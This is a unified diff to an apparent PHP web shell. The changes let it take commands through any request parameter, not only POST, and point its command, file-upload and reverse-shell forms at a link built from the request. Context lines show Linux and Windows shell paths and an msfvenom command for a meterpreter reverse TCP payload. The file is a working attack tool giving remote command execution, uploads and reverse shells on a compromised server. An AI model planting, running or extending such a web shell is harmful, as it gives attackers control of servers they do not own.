@@ -9,6 +9,8 @@ error_reporting(E_ALL);
 $linshell = '/bin/bash';
 $winshell = 'C:\\Windows\\System32\\cmd.exe';
 
+$actual_link = "http://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
+
 //msfvenom -p php/meterpreter/reverse_tcp LHOST=localhost LPORT=4444 -f raw | cut -b 14-1120 | base64
 //This payload will be decoded and edited to the supplied IP and port when a meterpreter shell is called.
 //The msfvenom line is supplied for verification that this is not a malicious payload.
@@ -152,7 +154,7 @@ else
 }
 
 
-if(isset($_POST["cmdsubmit"]))
+if(isset($_REQUEST['cmd']))
 {
 	$cmd = $_REQUEST['cmd'];
 	$o1 = '';
@@ -431,7 +433,7 @@ echo '<div style="width:auto; height:0vh; border:solid; color:rgb(201, 0, 0);"><
 echo '<div style="width:100%; height: 185px;">';
 echo '<div style="width:33%; height: auto; display: inline-block; float: left;">';
 
-echo '<form action="' . $url . '" method="post">';
+echo '<form action="' . $actual_link . '" method="post">';
 echo '<center>Command:</br> <input value="' . $cmd . '" type="text" name="cmd"></input></center></br>';
 echo '<center>Path:</br>    <input value="' . $path . '" type="text" name="path""></input></center></br>';
 echo '<center><input type="submit" name="cmdsubmit" value="Submit" style="background-color: rgb(201, 0, 0); color:#fff; border-radius:8px;"></button></center>';
@@ -440,7 +442,7 @@ echo '</form>';
 echo '</div>';
 echo '<div style="width:33%; height: auto; display: inline-block; float: left;">';
 
-echo '<form action="' . $url . '" method="post" enctype="multipart/form-data"			>';
+echo '<form action="' . $actual_link . '" method="post" enctype="multipart/form-data"			>';
 echo '<center>File:</br>   <input id="file" type="file" name="file"></input></center></br>';
 echo '<center>URL:</br>    <input name="url" value=""></input></center></br>';
 echo '<center><input type="submit" name="filesubmit" value="Upload" style="background-color: rgb(201, 0, 0); color:#fff; border-radius:8px;"></button></center>';
@@ -452,7 +454,7 @@ echo '</form>';
 echo '</div>';
 echo '<div style="width:33%; height: auto; display: inline-block; float: left;">';
 
-echo '<form action="' . $url . '" method="post" enctype="multipart/form-data"			>';
+echo '<form action="' . $actual_link . '" method="post" enctype="multipart/form-data"			>';
 echo '<center>IP Address:</br>    <input name="ip" value=""></input></center></br>';
 echo '<center>Port:</br>    <input name="port" value=""></input></center>';
 echo '<center><select name="shelltype" style="margin-top:8px;">';
